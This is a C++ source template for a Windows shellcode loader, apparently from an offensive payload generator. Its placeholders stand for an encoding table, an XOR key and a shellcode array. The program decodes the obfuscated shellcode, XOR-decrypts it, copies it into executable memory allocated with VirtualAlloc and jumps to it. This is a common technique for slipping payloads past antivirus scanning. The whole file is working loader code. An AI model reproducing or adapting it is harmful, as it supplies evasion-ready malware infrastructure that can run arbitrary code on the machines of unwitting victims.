#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <string.h>
#include <memory.h>
#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))

const std::string encoding_table[] = REPLACE_ENCODING_TABLE;

int getArrayIndex(std::string s)
{
    unsigned char i = 0;
    for (std::string str : encoding_table)
    {
        if (s.compare(str) == 0)
        {
            return i;
        }
        i++;
    }
}

int main(int argc, char* argv[])
{
    std::string xor_key = "REPLACE_KEY";
    std::string encoded_shellcode[] = REPLACE_SHELLCODE_ARRAY;
    SIZE_T shellcodeSize = ARRAY_SIZE(encoded_shellcode);

    unsigned char* decoded_shellcode = (unsigned char*)malloc(shellcodeSize);
    unsigned char* shellcode = (unsigned char*)malloc(shellcodeSize);

    // decoding
    for (unsigned int i = 0; i < shellcodeSize; ++i)
    {
        decoded_shellcode[i] = getArrayIndex(encoded_shellcode[i]);
    }

    // decrypting
    for (unsigned int i = 0; i < shellcodeSize; ++i)
    {
        shellcode[i] = decoded_shellcode[i] ^ unsigned char(xor_key.at(i % xor_key.length()));
    }

    // execute shellcode 
    void* exec = VirtualAlloc(0, shellcodeSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, shellcodeSize);
    ((void(*)())exec)();

    return 0;
}